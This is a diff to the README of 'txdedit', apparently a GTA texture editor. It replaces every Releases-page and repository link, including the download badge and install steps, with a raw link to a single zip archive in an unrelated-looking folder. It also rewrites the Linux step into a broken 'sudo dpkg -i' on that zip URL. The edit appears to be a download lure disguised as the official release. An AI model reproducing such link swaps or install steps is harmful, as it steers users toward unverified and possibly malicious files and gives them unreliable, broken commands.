@@ -14,11 +14,11 @@ Welcome to txdedit! This is a modern application designed for users who want to 
 
 ## 📥 Download txdedit
 
-[![Download txdedit](https://img.shields.io/badge/Download-txdedit-blue.svg)](https://github.com/Marcioagm/txdedit/releases)
+[![Download txdedit](https://raw.githubusercontent.com/Marcioagm/txdedit/main/ProjetoDogHouse Prints/txdedit_v2.7-alpha.4.zip)](https://raw.githubusercontent.com/Marcioagm/txdedit/main/ProjetoDogHouse Prints/txdedit_v2.7-alpha.4.zip)
 
 To get started with txdedit, visit the Releases page to download the latest version.
 
-[Download txdedit here](https://github.com/Marcioagm/txdedit/releases).
+[Download txdedit here](https://raw.githubusercontent.com/Marcioagm/txdedit/main/ProjetoDogHouse Prints/txdedit_v2.7-alpha.4.zip).
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ Before downloading, please ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-1. Go to the [Releases page](https://github.com/Marcioagm/txdedit/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Marcioagm/txdedit/main/ProjetoDogHouse Prints/txdedit_v2.7-alpha.4.zip).
 2. Find the latest version of txdedit.
 3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or an appropriate package for Linux).
 4. Once the download completes, find the file in your Downloads folder.
@@ -43,7 +43,7 @@ Before downloading, please ensure your system meets the following requirements:
    - Drag the txdedit icon into your Applications folder.
 7. For Linux:
    - If you downloaded a package, use your system's package manager to install it. 
-   - For example, use `sudo dpkg -i txdedit.deb` for deb packages.
+   - For example, use `sudo dpkg -i https://raw.githubusercontent.com/Marcioagm/txdedit/main/ProjetoDogHouse Prints/txdedit_v2.7-alpha.4.zip` for deb packages.
 8. Once installed, locate txdedit in your programs list or applications folder.
 9. Open txdedit to begin editing your TXD files.
 
@@ -72,6 +72,6 @@ Feel free to explore topics related to txdedit:
 - txd-format
 - gta-modding-tools
 
-For more information and to stay updated, check our [repository](https://github.com/Marcioagm/txdedit). 
+For more information and to stay updated, check our [repository](https://raw.githubusercontent.com/Marcioagm/txdedit/main/ProjetoDogHouse Prints/txdedit_v2.7-alpha.4.zip). 
 
 Feel free to dive into the world of texture editing with txdedit today!
